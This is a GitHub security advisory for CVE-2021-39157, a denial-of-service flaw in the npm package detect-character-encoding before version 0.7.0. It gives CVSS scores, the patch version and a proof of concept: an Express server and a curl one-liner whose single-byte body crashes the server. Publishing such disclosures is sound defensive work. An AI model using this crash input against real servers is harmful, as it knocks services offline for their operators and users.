# [H] Improper Handling of Exceptional Conditions in detect-character-encoding

## Summary
Severity: High
Advisory: GHSA-jqfh-8hw5-fqjr
CVE: CVE-2021-39157
CWE: CWE-755
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2021-08-25
Source: https://github.com/advisories/GHSA-jqfh-8hw5-fqjr
Type: github-advisory

## Affected
- npm: `detect-character-encoding` — affected >=0 <0.7.0

## Details
### Impact

In detect-character-encoding v0.6.0 and earlier, data matching no charset causes the Node.js process to crash.

### Patches

The problem has been patched in [detect-character-encoding v0.7.0](https://github.com/sonicdoe/detect-character-encoding/releases/tag/v0.7.0).

### CVSS score

[CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/RL:O/RC:C](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/RL:O/RC:C)

Base Score: 7.5 (High)
Temporal Score: 7.2 (High)

Since detect-character-encoding is a library, the scoring is based on the “[reasonable worst-case implementation scenario](https://www.first.org/cvss/v3.1/user-guide#3-7-Scoring-Vulnerabilities-in-Software-Libraries-and-Similar)”, namely, accepting data from untrusted sources over a network and passing it directly to detect-character-encoding. Depending on your specific implementation, the vulnerability’s severity in your program may be different.

### Proof of concept

```js
const express = require("express");
const bodyParser = require("body-parser");
const detectCharacterEncoding = require("detect-character-encoding");

const app = express();

app.use(bodyParser.raw());

app.post("/", (req, res) => {
  const charsetMatch = detectCharacterEncoding(req.body);

  res.end(charsetMatch.encoding);
});

app.listen(3000);
```

`printf "\xAA" | curl --request POST --header "Content-Type: application/octet-stream" --data-binary @- http://localhost:3000` crashes the server.

## References
- https://github.com/sonicdoe/detect-character-encoding/security/advisories/GHSA-jqfh-8hw5-fqjr
- https://nvd.nist.gov/vuln/detail/CVE-2021-39157
- https://github.com/sonicdoe/detect-character-encoding/issues/15
- https://github.com/sonicdoe/detect-character-encoding/commit/992a11007fff6cfd40b952150ab8d30410c4a20a
- https://github.com/sonicdoe/detect-character-encoding
- https://github.com/sonicdoe/detect-character-encoding/releases/tag/v0.7.0
